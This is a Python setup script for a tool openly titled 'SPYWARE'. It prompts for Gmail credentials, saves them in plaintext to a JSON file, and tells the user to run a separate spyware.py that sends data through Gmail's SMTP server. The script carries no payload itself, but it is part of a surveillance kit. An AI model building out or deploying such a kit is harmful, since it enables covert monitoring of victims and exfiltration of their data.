import os
import json
from termcolor import colored
from pyfiglet import figlet_format
import re


def create_file(email, password):
    info = {
        'email': email,
        'password': password
    }

    if not os.path.isdir('./user_info'):
        os.mkdir('user_info')
        print('[+] Created ./user_info directory')

    with open('./user_info/info.json', 'w+') as output_file:
        json_dump = json.dumps(info)
        output_file.write(json_dump)

    print('[+] Created ./user_info/info.json file')


def get_email():
    regex = '[A-Za-z0-9\.\+_]+@gmail\.com'
    result = True

    while result:
        email = input('Email: ')
        match = re.search(regex, email)

        try:
            match.group()
            result = False
            return email

        except AttributeError:
            print('Wrong email!\n')



def main():
    app_name = colored(figlet_format('SPYWARE'), color='magenta')

    print(app_name)
    print('-By dszyszek')
    print('===============================================================\n')
    print('You\'ll need gmail account to process (program uses their SMTP server)')

    email = get_email()

    passwword = input('Password: ')
    create_file(email, passwword)

    print(colored('\nOk, we\'re set, now run spyware.py file', color='yellow'))


if __name__ == '__main__':
    main()